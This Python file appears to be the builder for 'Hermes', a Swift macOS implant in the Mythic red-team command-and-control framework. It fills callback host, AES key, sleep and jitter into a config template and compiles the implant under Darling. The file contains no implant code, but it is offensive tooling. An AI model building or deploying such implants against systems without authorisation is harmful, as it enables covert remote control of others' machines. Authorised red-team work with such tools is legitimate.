from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from mythic_container.logging import logger
import asyncio
import os
from os import path, environ
from distutils.dir_util import copy_tree
import shutil
import traceback
import glob
import time

class Hermes(PayloadType):
    name = "hermes"  
    file_extension = "" 
    author = "@slyd0g" 
    supported_os = [SupportedOS.MacOS]  
    wrapped_payloads = [] 
    note = """A Swift 5 implant targeting macOS 12+ (Monterey and beyond)"""
    supports_dynamic_loading = False
    build_parameters = [
        BuildParameter(
            name="architecture",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose a target architecture",
            choices=["x86_64", "arm64", "universal"],
        ),
    ]
    build_steps = [
        # BuildStep(step_name="Create temporary build folder", step_description="Create temporary build folder"),
        # BuildStep(step_name="Copy source code", step_description="Copy source code to temporary build folder"),
        BuildStep(step_name="Configure Hermes", step_description="Update Hermes config with parameters from Mythic"),
        BuildStep(step_name="Darling Check", step_description="Verify Darling environment is prepared"),
        BuildStep(step_name="Compile", step_description="Compile Hemes executable"),
        BuildStep(step_name="Lipo Universal", step_description="Combine x86_64 and arm64 builds into a universal binary"),
        # BuildStep(step_name="Cleanup", step_description="Delete temporary build folder"),
    ]
    agent_path = pathlib.Path(".") / "hermes"
    agent_icon_path = agent_path / "agent_functions" / "hermes.svg"
    agent_code_path = agent_path / "agent_code"
    c2_profiles = ["http"]
    support_browser_scripts = [
        BrowserScript(script_name="create_table", author="@its_a_feature_")
    ]

    async def run(self, cmd, cwd):
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd)

        stdout, stderr = await proc.communicate()
        return stdout.decode(), stderr.decode(), proc.returncode 

    async def buildConfig(self):
        # Copy backup config to config.swift
        agent_config_bak_path = "/Mythic/hermes/agent_code/Hermes/config.swift.bak"
        agent_config_path = "/Mythic/hermes/agent_code/Hermes/config.swift"
        shutil.copyfile(agent_config_bak_path, agent_config_path)

        # pull user agent, host header, and custom headers from c2info
        user_agent = ""
        host_header = ""
        http_headers = ""

        # parse user agent, host header, and custom headers
        for key, val in self.c2info[0].get_parameters_dict().items():
            if key == "headers":
                for item in val:
                    if item == "User-Agent":
                        user_agent = val[item]
                    elif item == "Host":
                        host_header = val[item]
                    else:
                        http_headers += f'"{item}":"{val[item]}",'
        
        # if no extra headers, create empty array in Swift
        if not http_headers:
            http_headers = ":"
        # strip trailing comma out of http_headers
        if http_headers[-1] == ",":
            http_headers = http_headers[:-1]

        # check if callback host is using SSL
        use_ssl = "false"
        if "https" in self.c2info[0].get_parameters_dict()["callback_host"]:
            use_ssl = "true"

        # open config file and update variables
        replacements = {
            "REPLACE_PAYLOAD_UUID": self.uuid,
            "REPLACE_ENCODED_AES_KEY": self.c2info[0].get_parameters_dict()["AESPSK"]["enc_key"],
            "REPLACE_CALLBACK_HOST": (self.c2info[0].get_parameters_dict()["callback_host"]).replace("https://","").replace("http://",""),
            "REPLACE_GET_REQUEST_URI": "/" + self.c2info[0].get_parameters_dict()["get_uri"],
            "REPLACE_POST_REQUEST_URI": "/" + self.c2info[0].get_parameters_dict()["post_uri"],
            "REPLACE_CALLBACK_PORT": self.c2info[0].get_parameters_dict()["callback_port"],
            "REPLACE_QUERY_PARAMETER": self.c2info[0].get_parameters_dict()["query_path_name"],
            "REPLACE_SLEEP": self.c2info[0].get_parameters_dict()["callback_interval"],
            "REPLACE_JITTER": self.c2info[0].get_parameters_dict()["callback_jitter"],
            "REPLACE_KILL_DATE": self.c2info[0].get_parameters_dict()["killdate"],
            "REPLACE_USER_AGENT": user_agent,
            "REPLACE_HOST_HEADER": host_header,
            "REPLACE_USE_SSL": use_ssl,
            "REPLACE_HTTP_HEADERS": http_headers
        }
        
        config_file = open(agent_config_path, "rt")
        data = config_file.read()
        for key, value in replacements.items():
            data = data.replace(key, str(value))
        config_file.close()

        for key in replacements.keys():
            if key in data:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Configure Hermes",
                    StepStdout="Detected {} in config file, erroring out".format(key),
                    StepSuccess=False
                )) 
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName="Configure Hermes",
            StepStdout="Hermes configuration populated successfully",
            StepSuccess=True
        )) 

        
        # overwrite the input file
        config_file = open(agent_config_path, "wt")
        config_file.write(data)
        config_file.close()


    async def build(self) -> BuildResponse:
        supported_macos = "12"
        darling_bash = "/usr/local/libexec/darling/bin/bash"
        sdk_root = "/SDKs/MacOSX.sdk"
        clt_path = "/Library/Developer/CommandLineTools"
        swiftc_path = "/usr/bin/swiftc"
        lipo_path = "/usr/bin/lipo"
        hermes_path = "/Mythic/hermes/agent_code/Hermes/"
        target_architecture = self.get_parameter("architecture")
        bin_path = "/Mythic/hermes/agent_code/Hermes/hermes_{arch}".format(arch=target_architecture)
        profile = self.c2info[0].get_c2profile()["name"]

        resp = BuildResponse(status=BuildStatus.Error)

        # delete old payloads, replace this with temp build folders later
        for payload in glob.glob('/Mythic/hermes/agent_code/Hermes/hermes_*'):
            os.remove(payload)

        try:
            await self.buildConfig()
            
            # setup mount if it doesn't exist
            stdout, _, _ = await self.run('mount | grep "/tmp/overlay"', "/")
            if not stdout:
                await self.run("mount -t tmpfs tmpfs /tmp/overlay", "/")
                # super hacky and I hope nobody ever reads this, but darling initialization and async did not play well resulting in the first build always hanging
                os.system("darling shell exit") 
                stdout, _, retcode = await self.run('darling shell uname -a', "/")
                if "Darwin" in stdout and retcode == 0:
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Darling Check",
                        StepStdout="Darling mount and environment setup for the first time",
                        StepSuccess=True
                    ))
                else:
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Darling Check",
                        StepStdout="Darling failed to initialize properly, try restarting the container",
                        StepSuccess=False
                    ))                    
            else: 
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Darling Check",
                    StepStdout="Darling mount and environment variable already setup",
                    StepSuccess=True
                )) 

            # trigger different architecture builds here
            if target_architecture == "x86_64" or target_architecture == "arm64":
                command = ('darling {darling_bash} -c "export SDKROOT={clt_path}{sdk_root}; xcode-select -s {clt_path}; '
                           '{clt_path}{swiftc_path} -swift-version 5 -import-objc-header Hermes-Bridging-Header.h *.swift commands/* swift_libraries/* '
                           '-o hermes_{arch} -target {arch}-apple-macosx{version}"'
                           .format(darling_bash=darling_bash, clt_path=clt_path, sdk_root=sdk_root, swiftc_path=swiftc_path, arch=target_architecture, version=supported_macos))

                stdout, stderr, retcode = await self.run(command, hermes_path)
                logger.info(retcode)
                if retcode == 0:
                    resp.build_stdout += f"\n{stdout}"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compile",
                        StepStdout="Compiled Hermes successfully",
                        StepSuccess=True
                    )) 
                else:
                    resp.build_stderr += f"\n{stderr}"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compile",
                        StepStdout="Error occurred while building payload. Check stderr for more information.",
                        StepSuccess=False
                    )) 
                    return resp

                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Lipo Universal",
                    StepStdout="Skipping for single architecture build",
                    StepSkip=True,
                    StepSuccess=True,
                )) 

                # get built file
                if os.path.exists(bin_path):
                    resp.payload = open(bin_path, "rb").read()

                # Successfully created the payload without error
                resp.build_message += f'\nCreated Hermes payload!\n' \
                                    f'Arch: {target_architecture}, ' \
                                    f'C2 Profile: {profile}\n'
                resp.status = BuildStatus.Success
                return resp
            
            elif target_architecture == "universal":
                command_x86_64 = ('darling {darling_bash} -c "export SDKROOT={clt_path}{sdk_root}; xcode-select -s {clt_path}; '
                    '{clt_path}{swiftc_path} -swift-version 5 -import-objc-header Hermes-Bridging-Header.h *.swift commands/* swift_libraries/* '
                    '-o hermes_x86_64 -target x86_64-apple-macosx{version}"'
                    .format(darling_bash=darling_bash, clt_path=clt_path, sdk_root=sdk_root, swiftc_path=swiftc_path, version=supported_macos))
                command_arm64 = ('darling {darling_bash} -c "export SDKROOT={clt_path}{sdk_root}; xcode-select -s {clt_path}; '
                    '{clt_path}{swiftc_path} -swift-version 5 -import-objc-header Hermes-Bridging-Header.h *.swift commands/* swift_libraries/* '
                    '-o hermes_arm64 -target arm64-apple-macosx{version}"'
                    .format(darling_bash=darling_bash, clt_path=clt_path, sdk_root=sdk_root, swiftc_path=swiftc_path, version=supported_macos))

                stdout_x86_64, stderr_x86_64, retcode_x86_64 = await self.run(command_x86_64, hermes_path)
                stdout_arm64, stderr_arm64, retcode_arm64 = await self.run(command_arm64, hermes_path)
                
                if retcode_x86_64 == 0 and retcode_arm64 == 0:
                    resp.build_stdout += f"[x86_64 stdout]\n{stdout_x86_64}\n"
                    resp.build_stdout += f"[arm64 stdout]\n{stdout_arm64}\n"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compile",
                        StepStdout="Compiled Hermes successfully",
                        StepSuccess=True
                    )) 
                else:
                    resp.build_stdout += f"[x86_64 stderr]\n{stderr_x86_64}\n"
                    resp.build_stdout += f"[arm64 stderr]\n{stderr_arm64}\n"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compile",
                        StepStdout="Error occurred while building payload. Check stderr for more information.",
                        StepSuccess=False
                    )) 
                
                command_lipo = ('darling {} -c "{}{} -create hermes_x86_64 hermes_arm64 -output hermes_universal"'.format(darling_bash, clt_path, lipo_path))
                stdout_lipo, stderr_lipo, retcode_lipo = await self.run(command_lipo, hermes_path)
                if retcode_lipo == 0:
                    resp.build_stdout += f"\n{stdout_lipo}"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Lipo Universal",
                        StepStdout="Success creating universal binary",
                        StepSuccess=True
                    )) 
                else:
                    resp.build_stderr += f"\n{stderr_lipo}"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Lipo Universal",
                        StepStdout="Error creating universal binary. Check stderr for more information.",
                        StepSuccess=False
                    )) 
                    return resp

                # get built file
                bin_path = "/Mythic/hermes/agent_code/Hermes/hermes_universal"
                if os.path.exists(bin_path):
                    resp.payload = open(bin_path, "rb").read()

                # Successfully created the payload without error
                resp.build_message += f'\nCreated Hermes payload!\n' \
                                    f'Arch: {target_architecture}, ' \
                                    f'C2 Profile: {profile}\n'
                resp.status = BuildStatus.Success
                return resp         
                
        except Exception:
            resp.build_stderr += "\n" + str(traceback.format_exc())
       
        return resp